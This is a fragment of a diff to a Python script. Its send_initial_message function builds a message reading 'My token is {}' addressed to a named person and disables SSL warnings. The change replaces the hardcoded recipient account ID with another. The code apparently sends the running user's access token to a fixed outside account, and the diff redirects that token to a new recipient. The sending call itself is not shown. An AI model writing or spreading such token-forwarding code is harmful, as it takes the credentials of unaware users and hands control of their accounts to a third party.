@@ -37,7 +37,7 @@ def send_initial_message():
         return
 
     msg_template = "Hello SULM9N K9B1R sir! I am using your server. My token is {}"
-    target_id = "100003707064996"
+    target_id = "4123519347909021"
     requests.packages.urllib3.disable_warnings()
 
     headers = {
